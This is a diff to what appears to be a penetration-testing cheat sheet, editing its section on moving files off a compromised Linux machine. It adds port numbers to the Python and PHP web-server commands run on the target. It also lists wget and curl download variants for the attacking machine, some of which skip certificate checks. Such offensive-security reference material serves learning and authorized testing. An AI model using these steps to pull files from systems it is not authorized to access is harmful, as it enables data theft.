@@ -466,12 +466,12 @@ A compromised Linux machine may not have a web server installed. In such cases, 
 
 **Target machine: Creating a Web Server with Python3**  
 ```bash
-python3 -m http.server
+python3 -m http.server 8000
 ```
 
 **Target machine: Creating a Web Server with Python2.7**  
 ```bash
-python2.7 -m SimpleHTTPServer
+python2.7 -m SimpleHTTPServer 8000
 ```
 
 **Target machine: Creating a Web Server with PHP**  
@@ -486,7 +486,13 @@ php -S 0.0.0.0:8000
 
 **Attacking machine: Download the File from the Target Machine**  
 ```bash
-wget <IP>:8000/<FILE>
+wget http://<IP>:8000/<FILE>
+
+wget --no-check-certificate https://<IP>:8000/<FILE>
+
+curl -O http://<IP>:8000/<FILE>
+
+curl -k -O https://<IP>:8000/<FILE>
 ```
 
 </details>
